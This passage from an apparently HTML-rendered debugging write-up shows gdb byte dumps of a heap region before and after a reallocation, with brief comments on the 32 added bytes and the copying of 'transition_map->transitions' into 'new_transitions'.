    <span id="cb118-68"><a href="#cb118-68" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004850:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-69"><a href="#cb118-69" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004858:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-70"><a href="#cb118-70" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004860:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-71"><a href="#cb118-71" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004868:</span> 0x2a    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb118-72"><a href="#cb118-72" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004870:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-73"><a href="#cb118-73" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004878:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-74"><a href="#cb118-74" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004880:</span> 0x40    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-75"><a href="#cb118-75" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004888:</span> 0x05    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb118-76"><a href="#cb118-76" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004890:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-77"><a href="#cb118-77" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004898:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-78"><a href="#cb118-78" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048a0:</span> 0x40    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-79"><a href="#cb118-79" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048a8:</span> 0x06    0x00    0x00    0x00    0xfc    0x7f    0x00    0x00</span>
    <span id="cb118-80"><a href="#cb118-80" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048b0:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-81"><a href="#cb118-81" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048b8:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-82"><a href="#cb118-82" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048c0:</span> 0x40    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-83"><a href="#cb118-83" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048c8:</span> 0x07    0x00    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-84"><a href="#cb118-84" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048d0:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-85"><a href="#cb118-85" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048d8:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-86"><a href="#cb118-86" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048e0:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-87"><a href="#cb118-87" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048e8:</span> 0x32    0x00    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-88"><a href="#cb118-88" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048f0:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-89"><a href="#cb118-89" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048f8:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-90"><a href="#cb118-90" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004900:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-91"><a href="#cb118-91" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004908:</span> 0x33    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb118-92"><a href="#cb118-92" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004910:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-93"><a href="#cb118-93" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004918:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-94"><a href="#cb118-94" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004920:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-95"><a href="#cb118-95" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004928:</span> 0x34    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb118-96"><a href="#cb118-96" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004930:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-97"><a href="#cb118-97" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004938:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-98"><a href="#cb118-98" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004940:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb118-99"><a href="#cb118-99" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004948:</span> 0x3c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb118-100"><a href="#cb118-100" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004950:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb118-101"><a href="#cb118-101" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004958:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span></code></pre></div>
    <p>After the new allocation, should be 32 bytes more:</p>
    <div class="sourceCode" id="cb119"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb119-1"><a href="#cb119-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/768b</span> 0x617000004680</span>
    <span id="cb119-2"><a href="#cb119-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004680:</span> 0x40    0x16    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-3"><a href="#cb119-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004688:</span> 0x01    0x00    0x00    0x00    0xe0    0x60    0x00    0x00</span>
    <span id="cb119-4"><a href="#cb119-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004690:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-5"><a href="#cb119-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004698:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-6"><a href="#cb119-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046a0:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-7"><a href="#cb119-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046a8:</span> 0x0a    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-8"><a href="#cb119-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046b0:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-9"><a href="#cb119-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046b8:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-10"><a href="#cb119-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046c0:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-11"><a href="#cb119-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046c8:</span> 0x0b    0x00    0x00    0x00    0xff    0x0f    0x00    0x00</span>
    <span id="cb119-12"><a href="#cb119-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046d0:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-13"><a href="#cb119-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046d8:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-14"><a href="#cb119-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046e0:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-15"><a href="#cb119-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046e8:</span> 0x0c    0x00    0x00    0x00    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-16"><a href="#cb119-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046f0:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-17"><a href="#cb119-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000046f8:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-18"><a href="#cb119-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004700:</span> 0x80    0x16    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-19"><a href="#cb119-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004708:</span> 0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-20"><a href="#cb119-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004710:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-21"><a href="#cb119-21" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004718:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-22"><a href="#cb119-22" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004720:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-23"><a href="#cb119-23" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004728:</span> 0x14    0x00    0x00    0x00    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-24"><a href="#cb119-24" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004730:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-25"><a href="#cb119-25" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004738:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-26"><a href="#cb119-26" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004740:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-27"><a href="#cb119-27" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004748:</span> 0x15    0x00    0x00    0x00    0xfc    0x7f    0x00    0x00</span>
    <span id="cb119-28"><a href="#cb119-28" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004750:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-29"><a href="#cb119-29" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004758:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-30"><a href="#cb119-30" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004760:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-31"><a href="#cb119-31" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004768:</span> 0x16    0x00    0x00    0x00    0xfd    0xfd    0xfd    0xfd</span>
    <span id="cb119-32"><a href="#cb119-32" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004770:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-33"><a href="#cb119-33" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004778:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-34"><a href="#cb119-34" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004780:</span> 0xc0    0x16    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-35"><a href="#cb119-35" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004788:</span> 0x03    0x00    0x00    0x00    0x6e    0x73    0x00    0x00</span>
    <span id="cb119-36"><a href="#cb119-36" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004790:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-37"><a href="#cb119-37" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004798:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-38"><a href="#cb119-38" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047a0:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-39"><a href="#cb119-39" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047a8:</span> 0x1e    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-40"><a href="#cb119-40" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047b0:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-41"><a href="#cb119-41" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047b8:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-42"><a href="#cb119-42" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047c0:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-43"><a href="#cb119-43" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047c8:</span> 0x1f    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-44"><a href="#cb119-44" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047d0:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-45"><a href="#cb119-45" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047d8:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-46"><a href="#cb119-46" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047e0:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-47"><a href="#cb119-47" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047e8:</span> 0x20    0x00    0x00    0x00    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-48"><a href="#cb119-48" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047f0:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-49"><a href="#cb119-49" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000047f8:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-50"><a href="#cb119-50" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004800:</span> 0x00    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-51"><a href="#cb119-51" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004808:</span> 0x04    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-52"><a href="#cb119-52" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004810:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-53"><a href="#cb119-53" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004818:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-54"><a href="#cb119-54" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004820:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-55"><a href="#cb119-55" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004828:</span> 0x28    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-56"><a href="#cb119-56" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004830:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-57"><a href="#cb119-57" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004838:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-58"><a href="#cb119-58" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004840:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-59"><a href="#cb119-59" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004848:</span> 0x29    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-60"><a href="#cb119-60" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004850:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-61"><a href="#cb119-61" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004858:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-62"><a href="#cb119-62" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004860:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-63"><a href="#cb119-63" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004868:</span> 0x2a    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-64"><a href="#cb119-64" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004870:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-65"><a href="#cb119-65" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004878:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-66"><a href="#cb119-66" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004880:</span> 0x40    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-67"><a href="#cb119-67" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004888:</span> 0x05    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-68"><a href="#cb119-68" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004890:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-69"><a href="#cb119-69" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004898:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-70"><a href="#cb119-70" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048a0:</span> 0x40    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-71"><a href="#cb119-71" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048a8:</span> 0x06    0x00    0x00    0x00    0xfc    0x7f    0x00    0x00</span>
    <span id="cb119-72"><a href="#cb119-72" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048b0:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-73"><a href="#cb119-73" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048b8:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-74"><a href="#cb119-74" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048c0:</span> 0x40    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-75"><a href="#cb119-75" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048c8:</span> 0x07    0x00    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-76"><a href="#cb119-76" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048d0:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-77"><a href="#cb119-77" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048d8:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-78"><a href="#cb119-78" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048e0:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-79"><a href="#cb119-79" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048e8:</span> 0x32    0x00    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-80"><a href="#cb119-80" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048f0:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-81"><a href="#cb119-81" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6170000048f8:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-82"><a href="#cb119-82" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004900:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-83"><a href="#cb119-83" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004908:</span> 0x33    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-84"><a href="#cb119-84" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004910:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-85"><a href="#cb119-85" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004918:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-86"><a href="#cb119-86" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004920:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-87"><a href="#cb119-87" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004928:</span> 0x34    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-88"><a href="#cb119-88" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004930:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-89"><a href="#cb119-89" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004938:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-90"><a href="#cb119-90" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004940:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb119-91"><a href="#cb119-91" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004948:</span> 0x3c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-92"><a href="#cb119-92" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004950:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-93"><a href="#cb119-93" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004958:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb119-94"><a href="#cb119-94" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004960:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-95"><a href="#cb119-95" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004968:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-96"><a href="#cb119-96" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004970:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb119-97"><a href="#cb119-97" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004978:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span></code></pre></div>
    <p>Note how the last 32 bytes are empty:</p>
    <div class="sourceCode" id="cb120"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb120-1"><a href="#cb120-1" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004960:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb120-2"><a href="#cb120-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004968:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb120-3"><a href="#cb120-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004970:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb120-4"><a href="#cb120-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004978:</span> 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span></code></pre></div>
    <p>Stepping over, <code>new_transitions</code> receives the pointer <code>0x617000004a00</code> and theorethically, should have 768 bytes, as <code>transition_map-&gt;transitions</code>:</p>
    <div class="sourceCode" id="cb121"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb121-1"><a href="#cb121-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/768b</span> 0x617000004a00</span>
    <span id="cb121-2"><a href="#cb121-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a00:</span> 0x40    0x16    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-3"><a href="#cb121-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a08:</span> 0x01    0x00    0x00    0x00    0xe0    0x60    0x00    0x00</span>
    <span id="cb121-4"><a href="#cb121-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a10:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-5"><a href="#cb121-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a18:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-6"><a href="#cb121-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a20:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-7"><a href="#cb121-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a28:</span> 0x0a    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-8"><a href="#cb121-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a30:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-9"><a href="#cb121-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a38:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-10"><a href="#cb121-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a40:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-11"><a href="#cb121-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a48:</span> 0x0b    0x00    0x00    0x00    0xff    0x0f    0x00    0x00</span>
    <span id="cb121-12"><a href="#cb121-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a50:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-13"><a href="#cb121-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a58:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-14"><a href="#cb121-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a60:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-15"><a href="#cb121-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a68:</span> 0x0c    0x00    0x00    0x00    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-16"><a href="#cb121-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a70:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-17"><a href="#cb121-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a78:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-18"><a href="#cb121-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a80:</span> 0x80    0x16    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
